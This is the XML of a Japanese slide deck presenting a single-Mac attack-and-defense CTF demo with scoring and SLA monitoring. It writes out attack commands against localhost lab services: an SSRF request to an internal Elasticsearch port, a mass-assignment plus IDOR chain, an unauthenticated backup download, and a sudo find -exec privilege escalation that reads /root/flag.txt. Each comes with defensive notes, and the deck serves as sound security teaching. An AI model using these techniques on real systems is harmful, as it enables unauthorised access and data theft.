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A&amp;D CTF を1台のMacだけで再現したデモ。計画書の5シナリオ中4件が実際に動く。攻撃→提出→加点→SLA/防御まで通しで見せる。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左＝攻撃者、中央＝脆弱サービス3種、右＝SLA/スコア/表示。本番のVM一斉配布はdocker-composeで代用。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全体像を1分で。起動確認→攻撃4本→提出→SLA→まとめ。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起動3コマンド。psの出力を出しっぱなしにして稼働証跡にする。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9200は公開していない。SSRFでサーバ経由で内部ESを叩かせFLAG奪取。防御は宛先の許可リスト。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2段攻撃。is_adminを混ぜて昇格(Mass Assignment)し、所有者チェックの無いinfoで管理者機密を読む(IDOR)。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固定名＋/assets無認可でバックアップを回収。中にFLAGとローテーション秘密鍵。後者は横展開の踏み台。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SSHログイン後、.bash_historyとsudo -lでヒント。find -execでroot昇格しflag.txt奪取。脆弱性はsudoers設定。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提出で加点・二重提出拒否。SLAは3サービスをHTTP/TCPで監視しdefense_ptsに反映。1つ止めてDOWNを見せると効果的。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4/5稼働。⑤はバックドアだけ可、Dirty Pipeはカーネル共有のため実VMが要る。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結論：1台で攻撃4本＋提出＋防御まで通せる。IaCはcomposeで代用。残るはDirty Pipeのみ。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A2136"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="FF4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&amp; DEFENSE CTF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EAEE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単一マシンで動かす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EAEE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A&amp;D CTF デモ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計画書のシナリオ5件中 4件を、他メンバーの成果物に依存せず 1台の Mac だけで再現。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攻撃 → FLAG提出 → 加点 → SLA/防御ポイント までを一気通貫で実演する。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12680" y="17830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6D39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4/5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040112" y="2404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攻撃シナリオ稼働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12680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B8DE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040112" y="34564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脆弱サービス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12680" y="3886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6C45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1台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0040112" y="45079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で完結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担当: 神田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EE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全体構成 — 1台で A/D ループを再現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攻撃者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(実演者)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66160" y="1783080"/>
            <a:ext cx="4297680" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9474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892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2240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40880" y="2039112"/>
            <a:ext cx="658368" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141A2B"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="FF4D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039112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:8101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2834640"/>
            <a:ext cx="4297680" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9474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944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3291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Assign / IDOR / Backup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40880" y="3090672"/>
            <a:ext cx="658368" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141A2B"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="FF4D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3090672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:8102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3886200"/>
            <a:ext cx="4297680" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9474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9959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4343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find 権限昇格 (SSH)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4142232"/>
            <a:ext cx="658368" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141A2B"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="FF4D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4142232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:2222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80360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49640" y="1783080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18928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sla-checker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32520" y="2240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死活監視 HTTP×2 + TCP×1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49640" y="2834640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32520" y="29443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score-server :8001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32520" y="3291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スコア計算 / 二重提出防止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49640" y="3886200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39959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CTFd :8000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732520" y="4343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スコアボード表示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120640"/>
            <a:ext cx="11109960" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141A2B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257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の代用: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本番は Packer/Ansible/Terraform で校内ハイパーバイザに VM を一斉配布。単独では基盤が無いため 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で 1チーム分のスタックを1マシン上に再現している。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F6C45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EE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デモの流れ — 5ステップ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09960" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10976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8DE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783080" y="1929384"/>
            <a:ext cx="0" cy="45720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7830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起動 &amp; 稼働確認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→ ps で全サービス Up を確認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79192"/>
            <a:ext cx="11109960" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10976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79192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5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783080" y="2825496"/>
            <a:ext cx="0" cy="45720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679192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攻撃 ①〜④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679192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/ Mass Assign+IDOR / Backup漏洩 / sudo find で FLAG 奪取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75304"/>
            <a:ext cx="11109960" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10976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75304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D39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1783080" y="3721608"/>
            <a:ext cx="0" cy="45720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3575304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提出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3575304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score-server / CTFd へ提出 → 加点、二重提出は拒否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11109960" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10976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471416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D39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1783080" y="4617720"/>
            <a:ext cx="0" cy="45720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4471416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監視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54880" y="4471416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HTTP×2 + TCP×1 で死活判定 → 防御ポイントへ反映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367528"/>
            <a:ext cx="11109960" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10976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367528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C45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1783080" y="5513832"/>
            <a:ext cx="0" cy="45720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536752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54880" y="5367528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 シナリオ稼働・IaC代用・残課題(⑤)を提示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EE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起動 &amp; 稼働確認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23560" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141A2B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01952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起動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2240280"/>
            <a:ext cx="5166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スコア計算とスコアボード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~/score-server &amp;&amp; docker compose up -d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~/CTFd         &amp;&amp; docker compose up -d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競技サービス3種 + SLAチェッカー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~/ad-services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178308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141A2B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56248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739128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922008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19019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稼働確認  docker compose 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11112" y="224028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STATUS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service-a     Up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service-b     Up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service-c     Up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sla-checker   Up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全サービス稼働。FLAGローテータが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./flags/*.txt を毎ラウンド更新中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11109960" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6000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見せどころ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212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「システムが動いていること」の証跡として ps の出力を画面に残したまま攻撃デモに入る。各サービスは独立コンテナで、攻撃で1つ壊れても他は生き続ける = A/D らしい構成。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① — SERVICE-A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EE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SSRF — 内部サービスから FLAG を奪う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766560" cy="2514600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2909"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141A2B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01952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224028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-X POST \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http://localhost:8101/api/v1/profile/image \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'Content-Type: application/json' \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'{"image_url":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6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"http://127.0.0.1:9200/system-logs/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6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_search?q=FLAG"}'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FLAG{ssrf_demo_r1_...}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98080" y="1783080"/>
            <a:ext cx="4160520" cy="2514600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3273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なぜ刺さるか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26680" y="22860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9200番(内部ES相当)は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していない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外からは直接叩けない。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サーバに URL を渡させる SSRF が無いと FLAG に到達できない、という設計。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109960" cy="1554480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5294"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141A2B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6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防御の観点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のスキーム・宛先ホストを許可リストで制限し、127.0.0.1 / 内部レンジへの発信を遮断すれば防げる。防御側はサービスを止めず(=SLA維持)に塞ぐのが得点。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② — SERVICE-B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EE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Mass Assignment → IDOR の連鎖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01952"/>
            <a:ext cx="365760" cy="3657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8379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209397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一般ユーザー ctf-user でトークン取得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615184"/>
            <a:ext cx="365760" cy="365760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615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5511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Assignment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34440" y="28072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/profile に is_admin:true を混入 → 昇格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209544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328416"/>
            <a:ext cx="365760" cy="365760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328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644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34440" y="35204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/user/info?id=1 で管理者の secret_note(FLAG) を取得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178308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141A2B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56248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739128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6922008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19019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11112" y="224028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送ってはいけない is_admin を混ぜる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PUT .../user/profile \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6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'{"is_admin":true}'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他人(管理者 id=1)を参照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'.../user/info?id=1'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"secret_note":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"FLAG{massassign_idor_r1_...}"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141A2B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02920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ポイント: 単体では弱い2つの欠陥を連鎖させて管理者機密に到達。無検証UPDATEと所有者チェック欠如の合わせ技。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③ — SERVICE-B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EE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バックアップ漏洩 — 固定パス + 無認可配信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766560" cy="2651760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2759"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141A2B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01952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2240280"/>
            <a:ext cx="6309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昇格トークンで管理バックアップを生成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.../api/v1/admin/backup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認可なしで誰でも DL できてしまう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-o leak.tar.gz \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6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.../assets/backups/system_backup.tar.gz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xzf leak.tar.gz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db_dump.sql       : FLAG{...}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rotation_secret.txt: 秘密鍵まで漏洩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0" y="1783080"/>
            <a:ext cx="4160520" cy="2651760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3103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二重の脆弱点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2668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バックアップ名が固定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36992" y="26060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system_backup.tar.gz と推測可能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26680" y="29900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/assets が無認可配信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36992" y="32644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誰でも直接 DL できる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26680" y="36484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中身が過剰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936992" y="39227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に加えローテーション秘密鍵も同梱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846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横展開の踏み台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51663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漏れた rotation_secret はローテーターの秘密鍵。FLAG 1個の奪取に留まらず、以降のラウンドの FLAG を先読みできる = 攻撃の連鎖につながる点を強調する。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④ — SERVICE-C (SSH)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EE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sudo find による root 権限昇格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766560" cy="3063240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2388"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141A2B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01952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ssh -p 2222 ctf-user@localhost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2240280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~/.bash_history   # 過去の sudo find 痕跡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-l               # find が NOPASSWD と判明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/root/flag.txt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Permission denied     # 一般ユーザーでは不可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の -exec で root のまま読ませる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/usr/bin/find /etc/hostname \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6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-exec cat /root/flag.txt \; -quit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FLAG{sudo_find_privesc_r1_...}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-exec id ⇒ uid=0(root) を確認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0" y="1783080"/>
            <a:ext cx="4160520" cy="3063240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2687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なぜ刺さるか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26680" y="233172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脆弱性は OS ではなく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sudoers の設定ミス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ALL=NOPASSWD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-exec は任意コマンドを root で実行できる典型パターン。SSH 死活は TCP+バナーで監視。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6D3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6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/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EE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FLAG 提出 → 加点 → SLA → 防御ポイント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32120" cy="4206240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1957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提出とスコア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奪った FLAG を score-server / CTFd(:8000) に提出 → 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6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加点</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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同一 FLAG の再提出は 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拒否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（二重提出防止 = 不正対策）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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スコアボードに反映される様子を画面で見せる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49240" cy="2788920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2623"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141A2B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0528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6693408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6876288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190195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python3 main.py --once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65392" y="2240280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[✓] team1/service-a  UP  http://.../health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[✓] team1/service-b  UP  http://.../health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[✓] team1/service-c  UP  tcp://:2222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HTTP×2 + TCP+バナー×1 を1巡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scoreboard: sla_rate=1.0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defense_pts=5.0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470916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141A2B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48463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締めの一手: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わざと1サービスを stop → 再チェックで DOWN 判定 → 防御ポイント低下、まで見せると SLA の意味が伝わる。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6D3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6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EE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実装状況 — 5シナリオ中 4件が稼働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シナリオ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1783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9264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1109960" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14516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9456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D39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194560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21945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92640" y="21945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稼働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852928"/>
            <a:ext cx="11109960" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14516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5292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D39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852928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Assignment + IDOR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0" y="285292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92640" y="285292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稼働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511296"/>
            <a:ext cx="11109960" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14516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1129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D39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バックアップ漏洩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0" y="351129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92640" y="351129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稼働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169664"/>
            <a:ext cx="11109960" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14516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169664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D39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④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4169664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find 権限昇格 (SSH)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0" y="416966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service-c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92640" y="416966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稼働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4828032"/>
            <a:ext cx="11109960" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14516"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141A2B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82803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C45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⑤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600" y="4828032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vsftpd + Dirty Pipe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15200" y="482803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692640" y="482803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一部のみ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48640" y="5806440"/>
            <a:ext cx="11109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の vsftpd バックドアはコンテナで再現可能。Dirty Pipe(カーネル脆弱性)のみ、コンテナがホストカーネルを共有するため実VM相当が必要 = 単独では忠実再現不可。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1A2136"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="36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6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EAEE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神田ひとりで、A/D CTF を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EAEE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1台のマシンで通しで動かせる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794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4D5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攻撃 4本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846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/ Mass Assign+IDOR / Backup / sudo find が実際に FLAG を奪取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356616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44568" y="3794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6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44568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 &amp; 防御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44568" y="4846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加点・二重提出拒否と、HTTP+TCP 監視による防御ポイント連携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83296" y="356616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1A2136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11896" y="3794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B8DEF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8311896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11896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の代用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11896" y="4846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一斉配布を docker-compose で置換。残る課題は ⑤ の Dirty Pipe だけ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参照: ~/ad-services/DEMO.md（実演手順） / README.md（構成と代用案）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2026-07-25T07:57:42Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-25T07:57:42Z</dcterms:modified>
</cp:coreProperties>
</file>